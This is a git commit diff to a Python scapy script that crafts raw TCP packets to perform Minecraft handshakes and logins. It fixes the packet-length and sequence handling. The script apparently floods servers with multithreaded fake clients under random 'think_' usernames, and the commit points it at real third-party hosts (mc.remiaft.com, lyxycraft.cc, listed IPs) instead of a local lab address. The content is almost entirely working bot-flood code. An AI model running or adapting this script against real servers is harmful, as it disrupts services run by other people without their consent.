90ca9a240c2882c30e20f9d4950887ae853f03e3
鸭鸭 鸭 <enaiLusoaix@outlook.com>
2022-11-16 17:03:10 +0800

    修复传输的数据一部分没修改到的地方

--- main.py
+++ main.py
@@ -15,13 +15,15 @@ def sendTcp(imei,ip,port,host):
     pkg_2 = IP(dst=ip) / TCP(sport=sport, dport=port, flags='A', seq=seq, ack=ack)
     sr1(pkg_2, timeout=3, verbose=False)
     v = host.encode().hex()
-    a = bytes.fromhex("15002f0f"+v+"63dd02")
-    print("15002f0f"+v+"63dd02")
+    a = bytes.fromhex("{:02X}".format(int(len("002f"+"{:02X}".format(len(host))+v+"63dd02")/2)).lower()+"002f"+"{:02X}".format(len(host)).lower()+v+"63dd02")
+    print("{:02X}".format(int(len("002f"+"{:02X}".format(len(host))+v+"63dd02")/2)).lower()+"002f"+"{:02X}".format(len(host)).lower()+v+"63dd02")
+    seqe = len(a)
+    print(seqe)
     reply = send(IP(dst=ip) / TCP(sport=sport, dport=port, flags='PA', seq=seq, ack=ack) / a,verbose=False)
     v = imei.encode().hex()
     a = bytes.fromhex("{:02X}".format(len(imei)+2).lower()+"00"+"{:02X}".format(len(imei)).lower()+v)
     print("{:02X}".format(len(imei)+2).lower()+"00"+"{:02X}".format(len(imei)).lower()+v)
-    reply = sr1(IP(dst=ip) / TCP(sport=sport, dport=port, flags='PA', seq=seq + 22, ack=ack) / a,verbose=False)
+    reply = sr1(IP(dst=ip) / TCP(sport=sport, dport=port, flags='PA', seq=seq + seqe, ack=ack) / a,verbose=False)
     print('Send TCP To Server Successful')
 def random_(number):
     CHAT_ = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789"
@@ -30,8 +32,8 @@ def random_(number):
         c += CHAT_[random.randint(0,len(CHAT_)-1)]
     return c
 if __name__ == '__main__':
-    for i in range(0,7):
-        USERNAME = "think_"+random_(5)
-        threading.Thread(target=sendTcp,args=(USERNAME,'192.168.114.128',25565,'192.168.114.128')).start()
-        sleep(0.7)
-    # sendTcp('thinkJSP','192.168.114.128',25565,'192.168.114.128')
+    # for i in range(0,2):
+    #     USERNAME = "think_"+random_(5)
+    #     threading.Thread(target=sendTcp,args=(USERNAME,'117.90.126.215',25565,'lyxycraft.cc')).start()
+    #     sleep(0.7)
+    sendTcp('thinkJSP','180.188.16.62',25565,'mc.remiaft.com')
